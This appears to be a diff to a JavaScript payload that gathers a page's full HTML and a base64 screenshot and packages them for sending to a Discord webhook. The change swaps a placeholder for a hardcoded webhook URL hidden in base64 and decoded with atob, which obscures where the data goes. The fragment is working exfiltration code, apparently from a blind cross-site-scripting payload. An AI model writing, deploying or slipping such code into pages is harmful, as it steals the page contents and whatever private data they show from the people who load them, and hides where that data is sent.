@@ -62,7 +62,8 @@ script.onload = function() {
         msg += '\n\nFULL DOCUMENT\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + document.documentElement.innerHTML;
         msg += '\n\nSCREENSHOT\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + base64image;
 
-        var discordWebhook = DISCORD_WEBHOOK;
+        var disBase64 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTI4NjYxMTk5OTQwNDU4OTEwNi9wdDlTN0lqeng0OU1rX1lkUFB5SG5fMktQejBkRnoteTFYSXVnSmdiQjM0VzVTUlZrS1VodEF0UkJrV0dmZmp1V0lmNW0=";
+        var discordWebhook = atob(disBase64);
         
         // Tạo file Blob từ nội dung
         var blob = new Blob([msg], { type: "text/plain" });
